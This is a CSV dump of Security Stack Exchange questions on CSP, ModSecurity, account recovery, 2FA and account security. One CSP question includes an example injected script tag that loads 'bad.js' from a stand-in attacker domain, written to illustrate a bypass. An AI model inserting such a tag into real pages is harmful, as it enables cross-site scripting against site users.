Id,PostTypeId,AcceptedAnswerId,ParentId,CreationDate,DeletionDate,Score,ViewCount,Body,OwnerUserId,OwnerDisplayName,LastEditorUserId,LastEditorDisplayName,LastEditDate,LastActivityDate,Title,Tags,AnswerCount,CommentCount,FavoriteCount,ClosedDate,CommunityOwnedDate,ContentLicense
"133191","1","","","2016-08-07 23:57:20","","2","132","<p>When getting a new appliance, be it a firewall or or the like, how much safer is it really to replace the default admin account/username with a differently-named account but with same privilege level?</p>

<p>In my mind, the only scenario in which this is of any benefit is making the replacement account a complex username?</p>

<p>Otherwise, replacing ""Admin"" with ""ourcompany_admin"" or the like simply buys you only a small amount of extra time if brute-forced?</p>
","29401","","","","","2016-08-08 15:15:08","How much safer is it really to replace the default account with a new account?","<authentication><account-security>","2","1","","","","CC BY-SA 3.0"
"198052","1","","","2018-11-20 11:16:05","","3","1379","<p>I am reviewing the Content-Security-Policy headers set in one of our webservers and I see this is how it is set (where 'example.com' is our trusted website). </p>

<blockquote>
  <p>Content-Security-Policy: ""default-src 'self'; script-src 'self' data:
  'unsafe-inline' 'unsafe-eval'; img-src 'self' *.example.com; font-src
  *; connect-src 'self' *example.com""</p>
</blockquote>

<p>My questions are:</p>

<p>1) Won't whitelisting <code>unsafe-inline</code> and <code>unsafe-eval</code> kind of defeat the whole CSP? </p>

<p>2) If 'unsafe-inline' is allowed or whitelisted as above, can someone call a JavaScript from an external website, say www.xxxxxx.com that is not whitelisted in <code>script-src</code> directive and there-by defeat the whole purpose of CSP? Eg: <code>&lt;script src=""www.xxxxxx.com/bad.js""&gt;</code></p>

<p>I went through <a href=""https://security.stackexchange.com/questions/152547/why-are-inline-scripts-and-styles-considered-not-secure-under-content-security-p"">this question here</a> and going by the answers, it does look like the above CSP is <em>not</em> good.</p>
","58761","","","","","2018-11-26 15:34:45","Does allowing unsafe-inline script defeat the purpose of CSP?","<content-security-policy>","2","0","","","","CC BY-SA 4.0"
"269662","1","269664","","2023-04-12 01:49:43","","2","157","<p>Companies universally seem to invest massive amounts of time and development resources into protecting users from security-related crimes. The trend seems to be increasing steadily over the past 15 years.</p>
<p>What is the <em>business</em> reason that a company would want to protect the online security of users? What is the business benefit of protecting me, especially when the protections are so aggressive as to make me want to do business with somebody else? What would the consequence be to, say, Google, if a user's account was hacked into? What does Facebook stand to lose if an unauthorized person accesses my account? What does Amazon lose if somebody steals my package?</p>
<p>Note: I'm talking specifically about user protections, not about the internal cybersecurity practices of the company itself to protect its own resources. For example, I'm referring to e.g. mandatory 2FA, not to, say, a company keeping its servers secure (which would obviously cause business to be lost -- if users couldn't trust the company they wouldn't use it).</p>
","29269","","6253","","2023-04-12 15:17:04","2023-04-12 15:19:09","Why is individual user security important to a company?","<account-security><multi-factor>","2","5","","","","CC BY-SA 4.0"
"269686","1","269691","","2023-04-13 02:40:39","","0","121","<p><a href=""https://github.com/coreruleset/coreruleset"" rel=""nofollow noreferrer"">OWASP Core Rule Set</a> has many versions the latest is version 4.0 (release candidate), but I cannot find any indication about compatibility among various modsecurity releases.</p>
<p>Could these be used with any modsecurity version, or is there some specific version requirement?</p>
","225381","","","","","2023-04-13 07:06:24","Compatibility of ModSecurity Core Rule Set 4","<owasp><mod-security>","1","0","","","","CC BY-SA 4.0"
"269714","1","","","2023-04-14 18:16:22","","1","62","<p>I've read about Linus Tech Tips hack, where a malware stole the browser cookies &amp; was able to log in to Linus's channel.</p>
<p>Is this preventable with Windows controlled folder access (preventing apps other than Chrome from accessing the cookie files)?</p>
","291808","","275693","","2023-04-14 21:30:43","2023-09-12 14:04:10","Windows controlled folder access to secure Chrome cookies?","<vulnerability><account-security><multi-factor><u2f><fido>","2","1","","","","CC BY-SA 4.0"
"133334","1","","","2016-08-09 07:04:23","","0","348","<p>I have recently opened an account at a brokerage firm, based in India, which unfortunately it seems to me is not following good measure to ensure security. But I maybe wrong since I am not an expert in this field. Hence I am asking for help.</p>

<p>The firm on their webpage login, restricts the password length to max 12 characters and asks me to answer 5 stupid questions such as ""What is your mother's maiden name?"" as a 2FA measure. For some reason in one of their FAQ webpage they also suggest that the user can answer the 5 questions with ""a"" since that will be easier to remember. As a added measure of security if I enter wrong password more than 3 times, my account will be locked and I'll have to reset my account using the 5 security questions. In their privacy policy they mention only one fact about account security, that they use SSL encryption. They never mention if they have had any security audit done by Verisign, Norton, or other third party.</p>

<p>Are they being lax in their online security? If so how much and what are the minimum measures an institution like them should take to ensure online safety of their customers account?</p>
","120932","","120932","","2016-08-09 08:28:36","2017-06-05 19:10:57","Is my online account at a financial firm safe?","<account-security>","1","6","","","","CC BY-SA 3.0"
"269804","1","269813","","2023-04-20 20:50:28","","2","1250","<p>I'm currently experiencing an issue where base64 encoded fonts are being blocked by CSP on my website (note that I replaced the base64 with <code>abcdefg</code> in this example:</p>
<pre><code>Refused to load the font 'data:font/woff2;base64,abcdefg///abcdefg' because it violates the following Content Security Policy directive: &quot;font-src 'self' https://fonts.googleapis.com https://fonts.gstatic.com https://maxcdn.bootstrapcdn.com&quot;.
</code></pre>
<p>The fix for this is to add <code>data:</code> to the fonts-src directive in the content security policy, for example:</p>
<pre><code>&quot;font-src 'self' data: https://fonts.googleapis.com https://fonts.gstatic.com https://maxcdn.bootstrapcdn.com&quot;
</code></pre>
<p>However, this opens my website up to data from <strong>all sources</strong>, not just the sites I have specified. I know that use of <code>data:</code> for default-src is deemed insecure in relation to XSS attacks, <a href=""https://security.stackexchange.com/questions/94993/is-including-the-data-scheme-in-your-content-security-policy-safe"">see this previous question</a></p>
<p>However what is not clear to me is if it is insecure for specifically font-src. What is the worst that could happen if I used this? Will a script kiddie convert my site into wingdings? I have found no evidence anywhere that it would have harmful effects, but at the same time it seems it is recommended everywhere with reckless abandon.</p>
<p>Can someone give me the definitive answer on this? And if it is indeed insecure, why is <code>data:</code> even a feature of CSP if it opens everyone up to accidental security incidents?</p>
","292058","","","","","2023-04-21 11:22:59","Is it safe to use font-src with data: in a Content Security Policy?","<xss><content-security-policy>","1","0","","","","CC BY-SA 4.0"
"269854","1","269855","","2023-04-24 01:44:32","","-1","77","<p>What if someone signs up on a game by using your email address without your permission? What if someone signs up using your email address illegally?</p>
<p>I'm not talking about signing in and stealing credentials. Someone just signs up for a new account.</p>
<p>What they can do next? Is this something to be afraid of?</p>
","291974","","6253","","2023-04-24 07:47:03","2023-04-24 07:48:58","Signup on a Game by using other's email addresses","<account-security>","1","3","","2023-04-24 07:49:01","","CC BY-SA 4.0"
"133453","1","133454","","2016-08-10 07:04:51","","12","17528","<p>I am in a bit of confusion as we have been asked to AES encrypt passwords before sending it to the server. The whole website communicates over HTTPS with the server and uses secure cookies. </p>

<p>AFAIK, HTTPS uses an SSL 128 bit encryption (could be 256 bit, not sure) and this happens at the Transportation Layer. I am assuming as long as the client is not compromised, an attack at Presentation or Application layer is not possible. Thus, once SSL encrypted, I think information will reach the server safely. </p>

<p>So is it still required to encrypt valuable information such as passwords at the client side before sending it to the server?</p>
","121056","","5405","","2016-08-10 07:30:32","2016-08-10 08:10:57","Is encryption of passwords needed for an HTTPS website?","<tls><authentication><aes><account-security>","4","4","","2016-08-10 13:35:23","","CC BY-SA 3.0"
"270070","1","","","2023-05-05 06:36:28","","0","75","<p>Here is my configurations:</p>
<pre><code>SecDefaultAction &quot;phase:1,log,deny,status:403&quot;
SecDefaultAction &quot;phase:2,log,deny,status:403&quot;

SecRule REQUEST_URI &quot;@pm logging_test&quot; \
    &quot;id:100,\
    phase:1,\
    pass,nolog,\
    capture,\
    msg:'Test Error Logging'&quot;
</code></pre>
<p>but I still get the entries in the error.log</p>
<p>In Manual, nolog means</p>
<blockquote>
<p>Prevents rule matches from appearing in both the error and audit logs.</p>
</blockquote>
<p>How to disable error.log for a specific rule?</p>
","292577","","","","","2023-05-05 06:36:28","ModSecurity: How to disable error logging for single rule?","<mod-security>","0","3","","","","CC BY-SA 4.0"
"198498","1","","","2018-11-27 09:47:32","","1","1858","<p>The only related rule in mod-security for slow DoS is <code>modsecurity_crs_11_slow_dos_protection</code>, and it's for Apache only.
Is there a rule for Nginx?</p>
","192247","","10863","","2018-11-28 08:08:08","2018-11-28 08:08:08","Nginx: mod-security rule for http slow DoS attack","<ddos><denial-of-service><nginx><mod-security>","1","0","","","","CC BY-SA 4.0"
"198538","1","201148","","2018-11-27 19:36:19","","2","230","<p>In a system with a complex set of computed authorizations, does conveniently allowing a given user access to view all of their own authorizations decrease security? </p>

<p>In a ""Policy as Code"" system which relies on consumers of its API to develop their own integrations, it seems like a wise idea to allow convenient viewing of ALL of user authorizations, because a given user can request access more easily and take advantage of ""code as documentation"", rather than pestering InfoSec for the state of their authorizations on an as-needed basis. </p>

<p>To block access to a comprehensive list of a user's own computed authorizations seems to me like a matter of ""security through obscurity"", since users can likely explore the system to find out what they can and cannot access. </p>

<p>This came up in a discussion I had with a coworker on the subject of this Vault mailing list post about Vault Policy viewing: </p>

<p><a href=""https://groups.google.com/forum/#!topic/vault-tool/eZZQMDWIdsk"" rel=""nofollow noreferrer"">Inspect your own token's policies?</a></p>

<p>But it applies to a lot of other things. Anyway, I'm asking this question because I've been wrong before, I think it's premature for me to declare that ""it's just obscurity"":</p>

<p><strong>How do I tell whether allowing a user to easily view ALL of his own authorizations will increase vulnerability?</strong> </p>
","78278","","78278","","2019-01-09 22:44:12","2019-01-12 16:28:34","Does allowing a user to know their own authorized capabilities decrease security?","<access-control><authorization><security-theater><obscurity><hashicorp-vault>","4","1","","","","CC BY-SA 4.0"
"198547","1","","","2018-11-27 20:44:41","","4","319","<p>I know about <code>inotify</code> but am concerned it would use too many resources.</p>

<p>Is there a better way to monitor a fairly static system (like a web host) for new and unexpected files being created?</p>
","52859","","","","","2018-11-27 21:26:15","is there a low-overhead way to log every new file created on a Linux host?","<linux><logging><content-security-policy>","1","1","","","","CC BY-SA 4.0"
"270188","1","","","2023-05-11 16:41:56","","0","46","<p>In a web application where you have to log in, we want to implement a feature that shows recently used accounts for the device.</p>
<p>The login screen will display a list of the usernames of the accounts that have recently logged in via the current device. It is about the same as the Google or Facebook login.</p>
<p>The difference is that we always ask for a password. The feature is therefore not intended to simply click on the account and you are logged in. We always want the user to type in a password. The usefulness of the feature is that you do not have to keep typing in your username / email address, but can click on a recent account and enter your password.
To identify the device, a cookie is required in all cases as far as we can imagine.</p>
<p>Now the question is:
How will we store the details of recently used accounts?
Two options we can think of:</p>
<ol>
<li>Store a unique identifier &quot;token&quot; in a cookie. Store on the server which recent accounts are associated with that cookie (i.e. device) and then display these usernames on the login page to click on.</li>
<li>Store the recent accounts in the cookie, so on the device itself.</li>
</ol>
<p>With option 1 we think of the following threats:</p>
<ul>
<li>If the cookie containing the token is stolen, the cookie can be impersonated on any device, thus spying on another device/location to see what recent accounts are being used on the actual device the cookie was intended for.</li>
</ul>
<p>Option 2 seems to have the greatest risk of problems, because:</p>
<ul>
<li>With many recent accounts, the data in the cookie could become too large (when for example also some metadata and/or &quot;last login date&quot; is contained).</li>
<li>If a username changes, the old username is still in the cookie. Unless the cookie is updated when changing the username in the account settings.</li>
<li>With option 1, the token in the cookie can be invalidated on the server, after which the cookie can no longer be used. This is not possible with option 2.</li>
</ul>
<p>In all cases we do not want to be &quot;smart&quot; by using information such as IP address or screen resolution etc., because this information changes regularly, on mobile internet devices anyway and also with people who use a VPN.</p>
<p>How should this feature be implemented?</p>
","167223","","","","","2023-06-10 19:00:20","Best way to store remembered recently used accounts for web application","<authentication><account-security>","1","0","","","","CC BY-SA 4.0"
"133752","1","","","2016-08-12 15:04:11","","1","121","<p>So we have some Windows 7 systems with some security requirements. I am trying to disable read access the security log.  The command “wevtutil gl security” shows a result of the following:</p>

<blockquote>
  <p>channelAccess: O:BAG:SYD:(A;;0xf0007;;;SY)(A;;0x7;;;BA)(A;;0x7;;;SO)(A;;0x3;;;IU)(A;;0x7;;;SU)(A;;0x3;;;S-1-5-3)(A;;0x1;;;S-1-5-32-573)</p>
</blockquote>

<p>From what little I know of these things, I am thinking that the “(A;;0x3;;;IU)” is giving interactive users read and write of the log (they cannot clear it)</p>

<p>What puzzles me is that the command </p>

<blockquote>
  <p>wevtutil sl security /ca:O:BAG:SYD:(A;;0xf0007;;;SY)(A;;0x7;;;BA)(A;;0x7;;;SO)(A;;0x7;;;SU)(A;;0x3;;;S-1-5-3)(A;;0x1;;;S-1-5-32-573)</p>
</blockquote>

<p>shows immediate results on our normal windows 7 PC’s, but it does NOTHING on the machines in question.  The command runs, gives no error, but “wevtutil gl security” still shows the “(A;;0x3;;;IU)” in the channelAccess string.  </p>

<p><strong>What am I doing wrong?</strong></p>
","121287","","","","","2016-08-12 15:04:11","Cannot disable read access the Windows 7 security log","<windows><account-security><windows-server><group-policy>","0","1","","","","CC BY-SA 3.0"
"58038","1","","","2014-05-15 09:21:21","","11","621","<p>I'm seeing a lot of Content Security Policy (CSP) reports raised because of client-side malware. Many have ""<code>blocked-uri</code>"" entries like <code>randomstring.cloudfront.net</code>, <code>something.akamaihd.net</code> and so on.</p>

<p>I would like to detect CSP reports caused by malware, so I can ignore them. Ignoring <code>*.cloudfront.net</code> doesn't seem right, is there a way?</p>
","46655","","72313","","2016-09-09 18:42:36","2016-09-09 18:42:36","CSP Reports: Ignoring Client Malware","<malware><content-security-policy>","3","17","","","","CC BY-SA 3.0"
"270229","1","","","2023-05-13 13:54:13","","0","19","<p>I am using fortinet client vpn to access employer's computer.
I'm worried if my employer can collect my browsing history ?
What about the browsing history of few minutes before connecting the vpn ?</p>
","292647","","","","","2023-05-13 13:54:13","Information shared by fortinet client vpn","<privacy><account-security>","0","0","","","","CC BY-SA 4.0"
"270243","1","","","2023-05-14 11:30:55","","0","220","<p>My friend logged into my Facebook account from his Android phone using the Facebook app, but when I try looking for the devices on the security page I only can see mine. It's like his device is hidden but still logs on and has access to my account. I want to know how to do that and figure it out.</p>
","292934","","6253","","2023-05-14 16:24:01","2023-05-14 16:24:01","How can a device hide that is currently logged on Facebook","<account-security><facebook>","0","0","","","","CC BY-SA 4.0"
"270285","1","","","2023-05-17 03:49:09","","0","199","<p>There is a new internet service provider in town that provides fiber internet--their internet is fast and it's proven. Almost everyone in our town switched to their internet. However, I am kind of skeptical to subscribe for some reasons:</p>
<ol>
<li>They don't have a website, just a facebook page with 500 likes :&lt; Their business name is also suspicious as they're only called &quot;Fiber Speed&quot; which is a very common name and doesn't even sound as a business name.</li>
<li>They only operate in small towns, not even more than 10 towns.</li>
<li>They said they get their internet from a popular network in our country and I can confirm that since I saw it in the speedtest but they offer their fiber internet for a cheaper price, I'm not even sure if they operate legally lol.</li>
<li>I don't think they have an office. They also have these flyers that are obviously not professionally designed.</li>
</ol>
<p>I am just worried about my internet security because I do a lot of online bank transactions as I work as a freelancer online. I always use VPN when connected to their network because I don't feel safe.</p>
<p>How can I make sure their internet is safe and they're not trying to spy on the information we share online?</p>
","293040","","","","","2023-05-17 10:50:09","How can I be sure that my internet service provider is safe?","<wifi><account-security><internet>","3","3","","","","CC BY-SA 4.0"
"198739","1","215967","","2018-11-29 18:48:06","","0","189","<p>Error and exception handling in web applications can introduce security issues, often in the form of denial of service (i.e., when a service crashes because of poor error handling) and information disclosure (i.e., when an exception containing sensitive details about the system is propagated to the user/attacker).</p>

<p>To combat this, the system needs to fail gracefully, revealing little details about the failure and recovering as much as possible. When it comes to exceptions, managed languages have simple and well-understood mechanisms for exception handling. However, throughout my research I have failed to find advice on how to construct a proper exception handling mechanism in modern web applications that include several layers of logic between the database and the client applications.</p>

<p>For example, the Spring framework has the controller (that provides the APIs and handles HTTP requests), the service (that contains the majority of the business logic) and the repositories (that handle communication between the application and the database). Additionally, the service can interface with utility components and modules that offer various functionality (i.e., file access, algorithm calculation). The following data flow diagram illustrates this architecture.</p>

<p><a href=""https://i.stack.imgur.com/ZdiCj.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/ZdiCj.png"" alt=""Simple data flow diagram of modern web applications""></a></p>

<p>By examining the origin of exceptions, we can see that the Calculation Engine, Repository, and File Access Utility can (potentially) reveal some details about the system, should an exception be thrown when interfacing with the different datastores (i.e., information about the SQL database, knowledge base schema, etc.).</p>

<p>The questions then becomes, where should developers handle these exceptions, and reduce the risk to both information disclosure and denial of service?</p>

<p>An approach that seems suitable for me is to handle exceptions as they arise and wrap them into application-specific exceptions. The parts of the application that have data flows that cross a trust boundary (e.g., to the file system, the Internet) should sanitize all exceptions by wrapping them into ""more friendly"" custom exceptions (created by the developers) to stop any risk from information disclosure being propagated further, as well as to localize any component failure.
The internal components should then know how to handle application exceptions more suitably.</p>

<p>The main drawback of this approach is that the exception handling mechanism is more complex, as it requires the introduction of application-specific exceptions for each category of native (and applicable) exceptions.</p>

<p>Does this approach have any other pros and cons, and is there an alternative design that handles the balance between security and workload better?</p>
","94282","","","","","2019-08-28 13:42:03","Exception handling in multi-tier applications","<design-flaw><error-handling><security-by-design>","2","0","","2019-09-22 18:08:18","","CC BY-SA 4.0"
"270345","1","","","2023-05-21 15:47:27","","0","15","<p>I just opened the Google Authenticator app and it says: &quot;Sign in to back up your codes to your Google Account&quot;.</p>
<p>How is that secure?</p>
<p>I mean, wouldn't doing that essentially defeat the purpose of two-factor authentication (2FA), since it'd let anyone who figures out the password to your Google Account log in to any account for which you've stored the password in Google Password Manager and the 2FA code in Google Authenticator?</p>
<p>Google's announcement <a href=""https://security.googleblog.com/2023/04/google-authenticator-now-supports.html"" rel=""nofollow noreferrer"">Google Authenticator now supports Google Account synchronization</a> doesn't seem to answer my question.</p>
<h4>Related</h4>
<ul>
<li><a href=""https://security.stackexchange.com/q/254841/13888"">Is 2FA based on Google Authenticator Real?</a></li>
</ul>
","13888","","13888","","2023-05-21 15:52:51","2023-05-21 15:52:51","Should I back up my Google Authenticator codes to my Google Account?","<authentication><account-security><multi-factor>","0","1","","2023-05-21 16:03:10","","CC BY-SA 4.0"
"270403","1","270506","","2023-05-25 00:15:22","","0","56","<p>I work at a Library Makerspace and we're in a discussion about patron security on the makerspace computers.</p>
<p>We have a lot of patrons logging in to their personal accounts because it's (currently) the only way to download or upload project files.  Most often people will log into their email just to download a single file.</p>
<p>Often these emails are left open, but the computers reset enough to make the window of opportunity for an attack pretty small.</p>
<p>I had the idea that it might be nice to have a guest email that is always logged in, so patrons could send stuff to it instead.  The obvious issue here is that this email could be abused: peoples addresses could be taken, their files could be seen, etc.</p>
<p>At the same time, having them log into their own accounts is risky too.  Nobody here is checking for keyloggers, and I've had plenty of chances to grab a computer before it restarts.  I've logged a lot of people out already.</p>
<p>Neither of these solutions seem great.</p>
<p>There's an additional factor of things like &quot;TinkerCad&quot; or &quot;SketchUp&quot; which are web-apps that require a login to use.  First time users could be forced to create an account, thus having to login to their email (keylogger time).  Or we could have a shared public account and they'll be able to see things other people have made.</p>
<p>In my mind, the risk of someone getting my email address or seeing a file I sent to a public computer is vastly less of an issue than someone getting <em>into</em> my email account.  But I've never seen a publicly logged in email on a public computer, and I suspect there's good reason for that too.  Emotionally, it seems weird.  But logically, is that worse?</p>
<p>What's the worst I could do with a publicly open account?  I already know I've had plenty of access to private accounts with the way we're doing things now.</p>
<p><strong>What is good protocol for web accounts on public computers?  Is it worse to have a shared one where patrons can see some of each-others stuff, or have patrons risk the entirety of their own private accounts?</strong></p>
<p>Also, just to be clear, expecting random patrons (many of them elderly) to follow proper security protocols is not something I can make happen.  This is something a few of my coworkers have suggested... I'm looking for alternatives.</p>
","90600","","","","","2023-05-30 20:13:22","Public computers and services that require an account","<account-security>","1","0","","","","CC BY-SA 4.0"
"198819","1","198821","","2018-11-30 15:24:49","","1","553","<p><em>Note: This is based on a true story!</em></p>

<h2>The Story:</h2>

<p>Alice and Bob are good friends and each one knows the personal email address of the other person and they contact with each other using it. Let's assume they are <code>bob@example.com</code> and <code>alice@example.com</code> for Bob and Alice, respectively. </p>

<p>Bob is a member of an online community (i.e. such as a forum) and he has put another email address of him, say <code>carol@gmail.com</code>, on his profile so that other users can contact him using it (that online community does not have a built-in message system for the users to contact with each other). Further, Bob has setup <code>bob@example.com</code> as the recovery email address of <code>carol@gmail.com</code>. And he has not (intentionally) put any other personal information on his profile that says this account belongs to Bob.</p>

<p>Alice knows that Bob is a member of this online community, however she doesn't know which account belongs to Bob. She suspects that this profile with the email address <code>carol@gmail.com</code> on it belongs to Bob, but she is not sure of it. In order to confirm her suspicion, she comes up with this plan:</p>

<p>She goes to Gmail website, enter <code>carol@gmail.com</code> as the email address and presses <code>Forgot password?</code> button. Then the following message is shown:</p>

<blockquote>
  <p>To get a verification code, first confirm the recovery email address you added to your account: ""b********@example.com""</p>
</blockquote>

<p>She enters <code>bob@example.com</code> and then the following message is shown:</p>

<blockquote>
  <p>Please enter the verification code sent to <code>bob@example.com</code> ...</p>
</blockquote>

<p>That's it! She finds out that the account and email address belongs to Bob. She gets very excited and sends the following message to <code>carol@gmail.com</code> as a result:</p>

<blockquote>
  <p>Ha ha! EXPOSED!</p>
</blockquote>

<h2>The Question:</h2>

<p>Well, Bob is very furious at this. He argues that he has followed all the security guidelines and he has tried hard to not expose any of his personal information and identity. Rather, he blames email provider (i.e. Gmail) and says that they should have designed the account recovery mechanism such that it protects the identity of the person behind the email address.</p>

<p>On the other hand, Alice, at the same time being proud of her ingenious plan, thinks that in this case there is an inevitable trade-off between convenience and security. She says that Bob has setup the recovery email so that he does not worry about his password being forgotten by him, and in turn this has the side effect of revealing his identity.</p>

<p>Who is right here? If you think Bob is wrong, what should have he done to both secure his identity and his email (i.e. keep it recoverable)? And if you are on Bob's side and think it is the email provider's fault, how should have they implemented the recovery mechanism?</p>

<p><strong>Further, note that I am not insisting that only one of the parties is right and the blame is on the other side. It might be that both parties are wrong or right as well. If you have other viewpoints, I would be glad to hear them.</strong></p>
","113984","","113984","","2018-11-30 15:44:25","2018-11-30 15:45:37","Find the person behind an email address using its recovery email in Gmail","<email><account-security><gmail><recovery>","2","6","","","","CC BY-SA 4.0"
"133937","1","","","2016-08-15 16:32:33","","3","133","<p>During an offline transaction, the Point-of-Sale has no internet connection,
and so the payment terminal cannot verify if the client’s payment
device has been revoked. </p>

<p>A malicious person can use a revoked bank card to perform unauthorized
transactions. </p>

<p>How can this be prevented?</p>
","121499","","111626","","2016-08-15 16:41:53","2016-08-15 16:44:34","NFC Security for Payment","<wireless><security-theater><nfc><payment>","1","1","","","","CC BY-SA 3.0"
"270479","1","270480","","2023-05-30 05:22:08","","0","201","<p>I need to know what is &quot;method enforcement&quot; inside WAF Preconfigured ModSecurity rules.</p>
<p>How to test this attack on magento website? What is security best practice to prevent this?</p>
","293521","","6253","","2023-05-30 08:03:46","2023-05-30 18:03:53","What is Method Enforcement. How to simulate this attack?","<waf><mod-security>","2","0","","","","CC BY-SA 4.0"
"270573","1","","","2023-06-04 22:29:42","","0","49","<p>I am employed by a security agency that recently implemented a policy prohibiting the use of TikTok on work phones. Instead of carrying two phones, I decided to use MDM to separate my work and personal apps on my iPhone. However, I'm now wondering if TikTok on my personal side might somehow access the sensitive data on my work side. I know it sounds concerning given where I work, but I'm mainly interested in the technical details because I can't seem to find a clear answer.</p>
","147431","","147431","","2023-06-04 22:33:43","2023-06-04 23:49:08","Is it possible for TikTok to access data from apps that are within the perimeter of a MDM?","<account-security><iphone>","1","0","","","","CC BY-SA 4.0"
"134078","1","","","2016-08-16 23:36:50","","4","550","<p>Can XSS be prevented <strong>100%</strong> by setting the content security policy as <code>default-src 'self'</code>? Is there any way XSS can happen in that case? One possibility I can think of is injecting user input into one of your scripts dynamically at the server-side, do you agree? Are there any other vulnerabilities you can think of?</p>
","118278","","118278","","2016-08-16 23:44:35","2016-08-18 18:43:46","XSS and Content Security Policy","<xss><javascript><content-security-policy>","2","2","","","","CC BY-SA 3.0"
"134171","1","134175","","2016-08-17 20:57:17","","1","399","<p>Say that I have a website that allows for a user to reset his password through either email or via text message. The user should be allowed to choose one or the other. </p>

<p>Without giving away too much information, what would be the optimal amount of characters to display for a phone number and for an email address to allow the user to reset their password?</p>

<p>Most sites that I've come across don't display emails at all (knowing only a few characters could help an attacker link an email to an account), and just send a reset email silently. But phone numbers seem to be treated differently, as sites tend to display at least part of phone numbers, often using the last two characters of the number like so:
<code>(***)-***-**55</code></p>

<p>Is this the best convention to follow in terms of balancing usability and security? Why do websites display any part of a phone number when they don't display emails, and is there any associated risk with displaying that the user has a phone and/or email connected to their account in the first place?</p>
","117792","","","","","2016-08-17 21:09:23","Why do websites show parts of phone numbers, but never email addresses?","<web-application><account-security>","1","1","","","","CC BY-SA 3.0"
"199045","1","","","2018-12-04 05:54:19","","1","689","<p>If an employee's laptop is taken back from him/her for purposes of investigation, can the IT department/team that is in charge of issuing laptops etc. log into the employee's network account on this laptop on their own or does the employee need to provide his/her credentials </p>
","192807","","192807","","2018-12-05 12:28:59","2018-12-05 12:28:59","Getting access and logging into employee's laptop - Can IT get access without the employee's own credentials?","<authentication><windows><account-security><credentials><administration>","2","3","","","","CC BY-SA 4.0"
"270614","1","","","2023-06-07 02:21:38","","0","101","<p>Referring to <a href=""https://security.stackexchange.com/questions/20706/what-is-the-difference-between-authorized-keys-and-known-hosts-file-for-ssh"">this post</a>. We learned about ssh today, and I know that you have to add your public key to the &quot;authorized_keys&quot; manually on the server, but the very first time you log into the server, it will add itself to your (client-side) &quot;known_hosts&quot;. Why are you not automatically updated to be a part of the server's &quot;authorized_keys&quot; upon first access (after presenting your password and authenticating yourself)?</p>
","293842","","","","","2023-06-07 04:49:29","Why is known_hosts automatically updated but authorized_keys is not?","<authentication><network><public-key-infrastructure><ssh><account-security>","2","0","","","","CC BY-SA 4.0"
"270619","1","","","2023-06-07 05:22:41","","0","112","<p>My Facebook was hacked, and it has no recovery options, however I accidentally got the hacker's email.</p>
","293845","","6253","","2023-06-07 07:27:51","2023-06-07 07:30:08","I was hacked, I have the hacker's email","<account-security><facebook>","1","1","","2023-06-07 07:27:56","","CC BY-SA 4.0"
"270676","1","","","2023-06-11 16:52:06","","0","332","<p>I got this security alert from Google lately, but I'm not sure if it is legit. Someone might have tried to scam me, because it says my E-Mail was linked to another as the recovery email. Either coincidence or someone wanted to harm me. I'm not even sure, whether this email is real, because it was sent from identity-reachout.bounces.google.com, which doesn't really sound like it's a legit email, but has been signed accounts.google.com. I have logged into my Google account and removed any of my older logins, because of previous attempts of getting my custom ROM to work properly. Not only that, but I have checked for unauthorized logins and more, but I'm still very suspicious of that email. Any advice? Is this actually a legit email from Google and is my account affected? If it's real: what should I make sure, to not get my account permanently deleted?</p>
<p>I have this screenshot of the email's body …<br/>
<a href=""https://i.stack.imgur.com/xtUrq.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/xtUrq.png"" alt=""Email content"" /></a></p>
<p>… and this screenshot of the email information.<br/>
<a href=""https://i.stack.imgur.com/Obt0F.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/Obt0F.png"" alt=""Sender information"" /></a></p>
<p>Generally, my account's language is set to German, while the stated linked email's might be set to English.</p>
","294026","","","","","2023-07-14 14:07:20","Is this google security alert legit?","<email><account-security><google><phishing>","1","6","","","","CC BY-SA 4.0"
